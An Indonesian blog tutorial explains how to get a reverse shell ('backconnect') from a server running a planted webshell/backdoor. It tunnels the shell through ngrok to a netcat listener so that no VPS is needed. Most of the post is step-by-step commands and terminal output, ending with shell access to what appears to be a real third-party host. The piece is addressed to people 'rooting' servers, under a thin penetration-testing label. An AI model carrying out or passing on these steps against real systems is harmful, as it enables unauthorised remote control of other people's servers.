---
slug: backconnect-ngrok
title: Tutorial Backconnect Server Dengan Ngrok
description: Tutorial lengkap cara melakukan backconnect server menggunakan ngrok untuk teman-teman yang tidak memiliki VPS
date: 2019-05-03
author: Rahul
tags: ["tutorial", "ngrok", "pentest", "networking"]
featured: false
editable: true
---

<hr />

## [Introduction](#introduction)

Bagi temen temen yang mau _rooting server_ tapi tidak punya VPS, ada cara lain yaitu dengan menggunakan ngrok. Meskipun tidak semua server atau web shell support backconnect dengan ngrok, tidak ada salahnya mencoba kan?

<br />

Tutorial ini menggunakan _perl_ sebagai media backconnect antara _server_ dan _ngrok_.

<br />

## [Requirements](#requirements)

Berikut alat-alat yang diperlukan untuk tutorial ini:

- Ngrok [Download](https://ngrok.com/download) - Pilih sesuai sistem operasi kamu
- Server yang support perl sangat dianjurkan (sesuai dengan tutorial)
- Netcat [Download](https://eternallybored.org/misc/netcat/) - disini saya menggunakan windows

<br />

## [Download dan Auth Ngrok](#download-dan-auth-ngrok)

Jangan lupa untuk buat akun ngrok di sini guna mengautentikasi _token_. Ekstrak ngrok-XXX.zip nya lalu autentikasi token nya agar ngrok dapat berjalan. Ganti token sesuai dengan punyamu.

```shell
./ngrok authtoken initokenBqHnhg3_3X3JtBTSu1rNojz4kXXX
```

<br />

## [Konfigurasi Ngrok & Netcat](#konfigurasi-ngrok-netcat)

Selanjutnya jalankan _ngrok_ dengan _tcp_, port sesuai selera misalkan:

```shell
./ngrok.exe tcp 1991
```

Pastikan ngrok berjalan dengan baik seperti di bawah ini:

```shell
ngrok by @inconshreveable                                                       (Ctrl+C to quit)

Session Status                online
Account                       Tan (Plan: Free)
Version                       2.3.23
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://0.tcp.ngrok.io:16857 -> localhost:1991

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```

Jalankan netcat, pastikan port sesuai dengan port yang di jalankan di ngrok:

```shell
./nc.exe -lnvp 1991
```

Pastikan netcat berjalan walau masih listening:

```shell
λ .\nc.exe -lnvp 1991
listening on [any] 1991 ...
```

<br />

## [Backconnect Server](#backconnect-server)

Setelah semua terkonfigurasi, tinggal melakukan backconnect server ke komputer kita. Pastikan webshell yang kita gunakan mempunyai fitur backconnect.

<figure>
  <img src="https://i.postimg.cc/DZVy5BZ7/fitur-bc.png" alt="Fitur Backconnect di webshell/backdoor" />
  <figcaption>Fitur Backconnect di webshell/backdoor</figcaption>
</figure>

Setelah semua terkonfigurasi, isi server dengan `0.tcp.ngrok.io` dan isi Port dengan port yang dibuat oleh ngrok misal `16857`. Di sini saya menggunakan perl. Untuk `Bind port to /bin/sh Perl` abaikan saja. Klik `»`

<figure>
  <img src="https://res.cloudinary.com/tanmyid/image/upload/v1556851179/isi-bc_kodyu6.png" alt="Contoh backconnect" />
  <figcaption>Contoh backconnect</figcaption>
</figure>

Cek di netcat, apakah sukses melakukan backconnect. Jika sudah ada balasan dari server seperti di bawah, berarti sudah sukses backconnect:

```shell
λ .\nc.exe -lnvp 1991
listening on [any] 1991 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 62032
sh: no job control in this shell
sh-4.2$
```

<br />

## [Uji Coba Command Linux](#uji-coba-command-linux)

Selanjutnya tinggal Spawn TTY Shell. Mari kita coba jalankan command untuk memastikan kita sudah benar-benar mendapatkan shell nya:

```shell
sh-4.2$ uname -a
uname -a
Linux thewhitecloud.in 3.10.0-514.16.1.el7.x86_64 #1 SMP Wed Apr 12 15:04:24 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

<br />

## [Conclusion](#conclusion)

Tutorial ini berguna bagi kalian yang tidak mempunyai VPS saat melakukan penetration testing pada server. Dengan ngrok, kita bisa melakukan reverse connection tanpa memerlukan public IP address.

<br />

**Tips**: Pastikan firewall tidak memblokir koneksi keluar dari server target ke ngrok.
